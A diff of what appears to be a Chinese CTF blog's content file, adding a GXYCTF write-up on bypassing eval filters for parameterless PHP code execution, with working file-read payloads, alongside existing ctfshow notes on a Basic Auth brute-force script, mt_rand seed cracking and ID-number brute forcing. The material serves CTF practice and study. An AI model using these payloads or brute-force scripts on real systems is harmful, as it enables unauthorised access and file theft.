@@ -266,6 +266,8 @@
     <content><![CDATA[<h1 id="11月学习计划"><a href="#11月学习计划" class="headerlink" title="11月学习计划"></a>11月学习计划</h1><ul>
 <li><input disabled="" type="checkbox"> ctfshow之php特性</li>
 <li><input disabled="" type="checkbox"> ctfshow之sql注入</li>
+<li><input disabled="" type="checkbox"> 完成tinkphp5框架的学习</li>
+<li><input disabled="" type="checkbox"> 完成本月所有赛题的wp</li>
 </ul>
 ]]></content>
       <categories>
@@ -443,7 +445,34 @@
 <p>摘下来的代码会放在githack目录下</p>
 <p><img src="/./../image/achieve/202411/GXYCTF/image-20241115222634445.png" alt="image-20241115222634445"></p>
 <p>进入b4d0310f-0918-425b-8f37-c1069fc45ecf.node5.buuoj.cn_81文件可以看到有index.php，说明源代码被我们摘下来了</p>
-]]></content>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>preg_match(‘&#x2F;data://|filter://|php://|phar://&#x2F;i’, $_GET[‘exp’])–这里过滤了大部分的伪协议，比如 <code>data://</code>、<code>filter://</code>、<code>php://</code> 和 <code>phar://</code></p>
+<p>if (‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[a-z,_]+((?R)?)&#x2F;‘, NULL, $_GET[‘exp’]))–这里的匹配替换一个字符+符号+加上对括号的递归调用，例如以下</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/20210325204736-46bca358-8d68-1.png" alt="img"></p>
+<p>判断匹配替换后的 结果是不是为;，说明这里我们只能让传入的exp是仅包含函数调用的形式，替换结果才会为;，比如func();，而不应该有其他字符</p>
+<p>if (!preg_match(‘&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i’, $_GET[‘exp’])) –这里进一步检查输入中的字符是否包含关键字</p>
+<h3 id="解题思路-函数嵌套实现无参数rce"><a href="#解题思路-函数嵌套实现无参数rce" class="headerlink" title="解题思路:函数嵌套实现无参数rce"></a>解题思路:函数嵌套实现无参数rce</h3><p>明确了是需要实现无参数rce的话，那我们得通过第三层验证考虑哪些函数可以用了，</p>
+<p>preg_match(‘&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i’, $_GET[‘exp’])</p>
+<h4 id="payload1-读取文件"><a href="#payload1-读取文件" class="headerlink" title="payload1:读取文件"></a>payload1:读取文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
+
+<p>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名<br>next() 输出数组中的当前元素和下一个元素的值。<br>array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)<br>scandir() 函数返回指定目录中的文件和目录的数组。<br>pos() 输出数组中的当前元素的值。<br>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241116104609373.png" alt="image-20241116104609373"></p>
+<h4 id="payload2-数组操作"><a href="#payload2-数组操作" class="headerlink" title="payload2:数组操作"></a>payload2:数组操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=var_dump(scandir(pos(localeconv())));</span><br><span class="line">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;</span><br><span class="line"></span><br><span class="line">?exp=var_dump(array_reverse(scandir(pos(localeconv()))));</span><br><span class="line">array(5) &#123; [0]=&gt; string(9) &quot;index.php&quot; [1]=&gt; string(8) &quot;flag.php&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(2) &quot;..&quot; [4]=&gt; string(1) &quot;.&quot; &#125;</span><br><span class="line"></span><br><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p><code>pos() / current()</code> 默认返回数组第一个元素<br><code>end()</code> ： 将内部指针指向数组中的最后一个元素，并输出<br><code>next()</code> ：将内部指针指向数组中的下一个元素，并输出<br><code>prev()</code> ：将内部指针指向数组中的上一个元素，并输出<br><code>reset()</code> ： 将内部指针指向数组中的第一个元素，并输出<br><code>each()</code> ： 返回当前元素的键名和键值，并将内部指针向前移动</p>
+<p><code>pos()</code> 输出数组中的当前元素的值。</p>
+<p><code>localeconv()</code> 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
+<p><code>array_reverse()</code>函数将数组逆向返回</p>
+<h4 id="payload3：session-id"><a href="#payload3：session-id" class="headerlink" title="payload3：session_id"></a>payload3：session_id</h4><p>通过获取session_id设置为flag.php来获取flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">GET /?exp=highlight_file(session_id(session_start())); HTTP/1.1</span><br><span class="line">Host: 5e48725e-b21b-41a7-96d1-398a11a05f3d.node5.buuoj.cn:81</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">cookie:PHPSESSID=flag.php</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2>]]></content>
       <categories>
         <category>赛题wp</category>
       </categories>
@@ -1449,7 +1478,6 @@
 <p>找到flag。</p>
 <h2 id="方法二-自动爆破脚本"><a href="#方法二-自动爆破脚本" class="headerlink" title="方法二:自动爆破脚本"></a>方法二:自动爆破脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time<span class="comment">#用于延时</span></span><br><span class="line"><span class="keyword">import</span> requests<span class="comment">#用于发送请求</span></span><br><span class="line"><span class="keyword">import</span> base64<span class="comment">#用于base64编码</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ededa0b4-a3d7-43f0-9f06-c8db1fce2434.challenge.ctf.show/index.php&#x27;</span><span class="comment">#放入url</span></span><br><span class="line"></span><br><span class="line">password = []<span class="comment">#密码列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#读取密码字典/1.txt是字典密码</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#循环读取密码字典</span></span><br><span class="line">        data = f.readline() <span class="comment">#读取一行</span></span><br><span class="line">        <span class="keyword">if</span> data:<span class="comment">#判断是否为空</span></span><br><span class="line">            password.append(data)<span class="comment">#添加到列表</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#判断是否到达文件末尾</span></span><br><span class="line">            <span class="keyword">break</span><span class="comment">#结束循环</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:<span class="comment">#循环遍历密码列表</span></span><br><span class="line">    strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]<span class="comment">#拼接用户名和密码</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    &#125;<span class="comment">#设置请求头</span></span><br><span class="line">    rep =requests.get(url,headers=header)<span class="comment">#发送请求</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)<span class="comment">#延时0.2秒</span></span><br><span class="line">    <span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:<span class="comment">#判断请求是否成功</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(rep.text)<span class="comment">#打印响应内容</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
 <h1 id="web23条件爆破"><a href="#web23条件爆破" class="headerlink" title="web23条件爆破"></a>web23条件爆破</h1><p>1.查看题目</p>
 <p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/7a9fe5418c734bc885623e1945fba644.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
 <h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数:"></a>substr()函数:</h2><p>substr($string, start, length)函数用于从字符串$string中提取从start位置开始的length个字符。如果length省略，则默认提取到字符串的末尾。</p>
@@ -1474,20 +1502,12 @@
 <li>这行代码使用mt_srand函数设置随机数生成器的种子为372619038。这意味着每次以相同的种子初始化后，mt_rand()函数生成的随机数序列将是相同的。</li>
 <li>如果随机数种子定了 那么产生的随机数就是确定的</li>
 </ul>
-<h2 id="知识点-php伪随机数mt-rand-函数"><a href="#知识点-php伪随机数mt-rand-函数" class="headerlink" title="知识点:php伪随机数mt_rand()函数"></a>知识点:php伪随机数mt_rand()函数</h2><ul>
-<li><h3 id="mt-rand-函数"><a href="#mt-rand-函数" class="headerlink" title="mt_rand()函数"></a>mt_rand()函数</h3></li>
-</ul>
-<p>mt_rand()函数使用Mersenne Twister算法生成随机整数。</p>
+<h2 id="知识点-php伪随机数"><a href="#知识点-php伪随机数" class="headerlink" title="知识点:php伪随机数"></a>知识点:php伪随机数</h2><h3 id="mt-rand-函数"><a href="#mt-rand-函数" class="headerlink" title="mt_rand()函数"></a>mt_rand()函数</h3><p>mt_rand()函数使用Mersenne Twister算法生成随机整数。</p>
 <p>使用的语法:mt_rand();or mt_rand(min,max);,生成一个区间内的随机数。</p>
 <p>其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_get randmax()函数获得。</p>
-<ul>
-<li><h3 id="mt-srand-函数"><a href="#mt-srand-函数" class="headerlink" title="mt_srand()函数"></a>mt_srand()函数</h3></li>
-<li><p>mt_srand()函数为随机数生成器。提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点</p>
-</li>
-<li><p>php_mt_seed工具:</p>
-</li>
-<li><p>php_mt_seed是c语言编写的爆破随机数序列种子的工具</p>
-</li>
+<h3 id="mt-srand-函数"><a href="#mt-srand-函数" class="headerlink" title="mt_srand()函数"></a>mt_srand()函数</h3><p>mt_srand()函数为随机数生成器。提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点</p>
+<h3 id="php-mt-seed工具"><a href="#php-mt-seed工具" class="headerlink" title="php_mt_seed工具:"></a>php_mt_seed工具:</h3><ul>
+<li>php_mt_seed是c语言编写的爆破随机数序列种子的工具</li>
 </ul>
 <p>我们做一个实验:</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">0</span>);<span class="comment">//设置随机数播种为0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//每次运行都会获得相同的序列    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//去掉mt_srand()函数后，系统会自动给rand函数播种，但也是播种一次</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
@@ -1505,15 +1525,16 @@
 </ul>
 <p>若$rand为0，则执行if语句</p>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h2><p>1.?r&#x3D;0先回显查看mt_rand()第一次的随机数</p>
-<h3 id="2-用php-rand-seed脚本"><a href="#2-用php-rand-seed脚本" class="headerlink" title="2.用php_rand_seed脚本"></a>2.用php_rand_seed脚本</h3><p>先用gcc编译脚本gcc -o php_mt_seed php_mt_seed.c</p>
+<p>2.用php_rand_seed脚本</p>
+<p>先用gcc编译脚本gcc -o php_mt_seed php_mt_seed.c</p>
 <p>爆破出之前播种的随机数种子的值.&#x2F;php_rand_seed 567219768</p>
 <p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/a26995fd26644e409374f8e4b4a79de7.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
 <p>seed选择kali工具得到的结果中php7的结果，然后编写php代码得到cookie的值:</p>
-<?php mt_srand(3147772674); echo mt_rand()."\n"; echo mt_rand()+mt_rand(); ?>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">3147772674</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>在网页cookie中放入得到的值，一个个尝试就可以得到flag了</p>
 <p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/fed24da88b9d4affaadf95138d5a8f69-1730818264224-14.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<h1 id="web26数据库连接信息爆破、"><a href="#web26数据库连接信息爆破、" class="headerlink" title="web26数据库连接信息爆破、"></a>web26数据库连接信息爆破、</h1><p>这题抓包就能拿到flag了，有点抽象</p>
+<h1 id="web26数据库连接信息爆破"><a href="#web26数据库连接信息爆破" class="headerlink" title="web26数据库连接信息爆破"></a>web26数据库连接信息爆破</h1><p>这题抓包就能拿到flag了，有点抽象</p>
 <h1 id="web27信息收集-日期爆破"><a href="#web27信息收集-日期爆破" class="headerlink" title="web27信息收集+日期爆破"></a>web27信息收集+日期爆破</h1><p>打开靶机，发现是个登录页面，需要学号和密码登录，猜测登录后可获得flag，则可围绕获得学号密码来进行，因为两者都不知道，直接爆破不太合适，看看还能提取到什么信息。</p>
 <p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/1c0c94f0642b40feac756cade867a00c-1730818268343-18.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
 <p>当点击到登录按钮下方的录取名单时，自动下载了一个list.xlsx，打开这个文件，发现了几个人的姓名和身份证号部分信息。点击录取名单下面的学生学籍信息查询系统，发现可以根据学生姓名和身份证号进行录取查询，那么第一步要做的可能就是要爆破身份证号了，或许在这里可以查到有用的信息。</p>
@@ -1521,11 +1542,11 @@
 <ul>
 <li>打开抓包工具，如Burpsuit，点击查询，抓到查询发送的请求包，将请求包发送至Intruder攻击模块，将请求包中的&amp;p设置为变量</li>
 </ul>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/4cb7a0f41b8f4aa7b7fa7fc37173188c-1730818272849-22.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/4cb7a0f41b8f4aa7b7fa7fc37173188c-1730818272849-22.png" alt="img"></p>
 <ul>
 <li>设置payload</li>
 </ul>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/7f96d063ce374500bb095fd466a98b6b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/7f96d063ce374500bb095fd466a98b6b.png" alt="img"></p>
 <p>format那栏一定要写yyyyMMdd对应身份证的年月日，然后就开始爆破</p>
 <p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/a34dace7731241758d97f01c2f99847e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
 <p>爆破后找到长度最长的response，可以看到有success，把下面那串编码复制拿去翻译一下</p>
